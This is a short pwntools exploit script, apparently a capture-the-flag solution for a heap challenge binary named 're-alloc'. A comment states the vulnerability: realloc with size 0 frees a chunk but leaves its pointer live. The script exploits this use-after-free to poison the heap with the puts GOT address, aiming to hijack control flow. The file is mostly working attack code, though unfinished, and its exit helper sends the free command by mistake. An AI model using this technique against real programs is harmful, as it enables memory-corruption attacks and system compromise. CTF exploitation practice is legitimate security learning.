from pwn import *
debug = 1
if debug:
	s = process('./re-alloc')
	raw_input('debug')
else:
	s = remote()

def alloc(index,size,data):
#0x00000000040133C
	s.sendlineafter("Your choice: ",'1')
	s.sendlineafter('Index:',str(index))
	s.sendlineafter('Size:',str(size))
	s.sendlineafter('Data:',data)

def realloc(index,size,data):
#0x00000000040149A
	s.sendlineafter("Your choice: ",'2')
	s.sendlineafter('Index:',str(index))
	s.sendlineafter('Size:',str(size))
	if(size != 0):
		s.sendlineafter('Data:',data)
	else:
		log.info('error with size = 0')
	
def rfree(index):
#0x00000000004015DD
	s.sendlineafter("Your choice: ",'3')
	s.sendlineafter('Index:',str(index))

def exit():
	s.sendlineafter("Your choice: ",'3')

'''
vuln: when we realloc, the function don't check the size if it = 0 , so if we realloc with size= 0, the chunk be freed
but its pointer still exists
'''
alloc(0,0x78,'lethanhtuan')
realloc(0,0x0,'realloc')
puts_got = 0x404028
realloc(0,0x20,p32(puts_got))
# rfree(0)

s.interactive()
s.close()